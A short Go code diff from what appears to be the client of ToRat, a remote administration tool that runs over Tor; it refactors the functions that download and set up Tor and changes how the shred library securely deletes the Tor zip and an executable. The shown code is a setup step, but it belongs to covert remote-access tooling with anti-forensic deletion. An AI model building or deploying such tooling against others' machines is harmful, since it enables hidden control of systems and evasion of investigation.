@@ -13,7 +13,7 @@ import (
 	"path/filepath"
 	"strings"
 
-	"github.com/lu4p/ToRat_client/shred"
+	"github.com/lu4p/shred"
 )
 
 func installTor() {
@@ -29,7 +29,7 @@ func installTor() {
 
 func downloadTor() error {
 	log.Println("downloadTor")
-	resp, err := http.Get("https://www.torproject.org/dist/torbrowser/8.0.4/tor-win32-0.3.4.9.zip")
+	resp, err := http.Get(WinTorLink)
 	if err != nil {
 		return err
 	}
@@ -104,8 +104,8 @@ func setupTor() error {
 	if err != nil {
 		return err
 	}
-	shred.File(filepath.Join(TorPath, "tor-gencert.exe"), true)
-	shred.File(TempZip, true)
+	shred.Conf{1, true, true}.File(filepath.Join(TorPath, "tor-gencert.exe"))
+	shred.Conf{1, true, true}.File(TempZip)
 	os.Mkdir(TorData, os.ModePerm)
 	return nil
 }
